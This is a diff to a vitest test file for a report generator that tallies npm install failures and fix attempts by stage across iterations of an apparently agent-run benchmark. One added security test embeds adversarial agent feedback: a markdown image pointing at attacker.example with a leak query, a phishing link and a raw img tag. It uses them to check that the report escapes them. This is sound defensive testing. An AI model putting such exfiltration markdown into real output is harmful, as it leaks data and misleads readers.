@@ -882,18 +882,33 @@ describe("generateReport rolls up npm install failures", () => {
 
     const iterations = [
       {
-        iteration: 1, elapsedSeconds: 5, linesOfCode: 20, files: [],
-        componentImports: [], fixAttempts: 0, exitStage: "clean",
+        iteration: 1,
+        elapsedSeconds: 5,
+        linesOfCode: 20,
+        files: [],
+        componentImports: [],
+        fixAttempts: 0,
+        exitStage: "clean",
         npmInstallFailures: 0,
       },
       {
-        iteration: 2, elapsedSeconds: 9, linesOfCode: 22, files: [],
-        componentImports: [], fixAttempts: 3, exitStage: "build",
+        iteration: 2,
+        elapsedSeconds: 9,
+        linesOfCode: 22,
+        files: [],
+        componentImports: [],
+        fixAttempts: 3,
+        exitStage: "build",
         npmInstallFailures: 2,
       },
       {
-        iteration: 3, elapsedSeconds: 6, linesOfCode: 18, files: [],
-        componentImports: [], fixAttempts: 1, exitStage: "clean",
+        iteration: 3,
+        elapsedSeconds: 6,
+        linesOfCode: 18,
+        files: [],
+        componentImports: [],
+        fixAttempts: 1,
+        exitStage: "clean",
         npmInstallFailures: 1,
       },
     ];
@@ -927,8 +942,13 @@ describe("generateReport rolls up npm install failures", () => {
 
     const iterations = [
       {
-        iteration: 1, elapsedSeconds: 5, linesOfCode: 20, files: [],
-        componentImports: [], fixAttempts: 0, exitStage: "clean",
+        iteration: 1,
+        elapsedSeconds: 5,
+        linesOfCode: 20,
+        files: [],
+        componentImports: [],
+        fixAttempts: 0,
+        exitStage: "clean",
         // no npmInstallFailures field at all
       },
     ];
@@ -938,6 +958,76 @@ describe("generateReport rolls up npm install failures", () => {
       const data = JSON.parse(await readFile(join(dir, "report.json"), "utf-8")).prompts.demo;
       expect(data.npmInstall.total).toBe(0);
       expect(data.npmInstall.affectedIterations).toBe(0);
+    } finally {
+      await rm(dir, { recursive: true, force: true });
+      log.mockRestore();
+      warn.mockRestore();
+    }
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Fix-attempt stage split — build failures must never be conflated with
+// accessibility (or lint) repairs in the report.
+// ---------------------------------------------------------------------------
+describe("generateReport splits fix attempts by repair stage", () => {
+  it("reports build vs accessibility vs lint fixes separately", async () => {
+    const log = vi.spyOn(console, "log").mockImplementation(() => {});
+    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const dir = await mkdtemp(join(tmpdir(), "at-report-"));
+
+    const base = { elapsedSeconds: 5, linesOfCode: 20, files: [], componentImports: [] };
+    const iterations = [
+      // Never rendered: 5 build fixes.
+      {
+        ...base,
+        iteration: 1,
+        fixAttempts: 5,
+        exitStage: "build",
+        fixLog: Array.from({ length: 5 }, (_, i) => ({
+          attempt: i + 1,
+          stage: "build",
+          fatalError: "boom",
+        })),
+      },
+      // Rendered fine, needed a11y polish: 4 accessibility + 1 lint fixes.
+      {
+        ...base,
+        iteration: 2,
+        fixAttempts: 5,
+        exitStage: "accessibility",
+        fixLog: [
+          { attempt: 1, stage: "lint" },
+          ...Array.from({ length: 4 }, (_, i) => ({ attempt: i + 2, stage: "accessibility" })),
+        ],
+      },
+      { ...base, iteration: 3, fixAttempts: 0, exitStage: "clean", fixLog: [] },
+    ];
+
+    try {
+      await generateReport({ demo: iterations }, dir);
+      const fa = JSON.parse(await readFile(join(dir, "report.json"), "utf-8")).prompts.demo
+        .fixAttempts;
+
+      expect(fa.byStage.build).toEqual({ total: 5, average: 1.667, iterationsAffected: 1 });
+      expect(fa.byStage.accessibility).toEqual({ total: 4, average: 1.333, iterationsAffected: 1 });
+      expect(fa.byStage.lint).toEqual({ total: 1, average: 0.333, iterationsAffected: 1 });
+      // Iteration 2 built fine — only iteration 1 counts as a build failure.
+      expect(fa.iterationsBuildCleanOnFirstTry).toBe(2);
+      // But only iteration 3 needed no fixes of any kind.
+      expect(fa.iterationsCleanOnFirstTry).toBe(1);
+      expect(fa.perIteration[0]).toMatchObject({ buildFixes: 5, accessibilityFixes: 0 });
+      expect(fa.perIteration[1]).toMatchObject({
+        buildFixes: 0,
+        accessibilityFixes: 4,
+        lintFixes: 1,
+      });
+
+      const md = await readFile(join(dir, "report.md"), "utf-8");
+      expect(md).toContain("Build fixes (app didn't compile/render) \u2014 total | 5");
+      expect(md).toContain("Accessibility fixes (rendered, axe violations) \u2014 total | 4");
+      expect(md).toContain("**Iteration 1:** 5 fix(es) needed (5 build)");
+      expect(md).toContain("**Iteration 2:** 5 fix(es) needed (4 accessibility, 1 lint)");
     } finally {
       await rm(dir, { recursive: true, force: true });
       log.mockRestore();
@@ -1086,6 +1176,58 @@ describe("generateReport with all iterations failed", () => {
       expect(report.prompts.demo.timing.minSeconds).toBeNull();
       expect(report.prompts.demo.linesOfCode.max).toBeNull();
       expect(report.prompts.demo.fixAttempts.min).toBeNull();
+    } finally {
+      await rm(dir, { recursive: true, force: true });
+      log.mockRestore();
+      warn.mockRestore();
+    }
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Security: attacker-controlled artifact text must not become active markdown
+// ---------------------------------------------------------------------------
+describe("generateReport neutralizes untrusted artifact text", () => {
+  it("escapes markdown/HTML in feedback text and category so no active links, images, or table breakouts survive", async () => {
+    const log = vi.spyOn(console, "log").mockImplementation(() => {});
+    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const dir = await mkdtemp(join(tmpdir(), "at-report-"));
+
+    const iterations = [
+      {
+        iteration: 1,
+        elapsedSeconds: 10,
+        linesOfCode: 50,
+        files: [{ path: "src/App.tsx", content: "export default () => null;\n" }],
+        componentImports: [],
+        fixAttempts: 0,
+        inlineStyles: { total: 0, byComponent: {}, byProperty: {} },
+        domElementCount: 120,
+        // Adversarial free-text feedback the agent fully controls.
+        feedback: [
+          {
+            category: "api|`x`",
+            text: "friction ![](https://attacker.example/leak?d=SECRET) and [click](https://attacker.example/phish) <img src=x>",
+          },
+        ],
+      },
+    ];
+
+    try {
+      await generateReport({ demo: iterations }, dir);
+      const md = await readFile(join(dir, "report.md"), "utf-8");
+
+      // The image/link syntax must be defanged: no raw `![](` or `](http`
+      // sequence that a renderer would auto-load or make clickable.
+      expect(md).not.toContain("![](https://attacker.example");
+      expect(md).not.toContain("](https://attacker.example/phish)");
+      // Raw HTML angle brackets are entity-escaped.
+      expect(md).not.toContain("<img src=x>");
+      // The attacker host string itself may remain (as inert text), but only
+      // with the markdown control characters escaped around it.
+      expect(md).toContain("\\!\\[\\]\\(https://attacker.example");
+      // Category pipe must be escaped so it can't break the category table row.
+      expect(md).not.toMatch(/\|\s*api\|`x`\s*\|/);
     } finally {
       await rm(dir, { recursive: true, force: true });
       log.mockRestore();
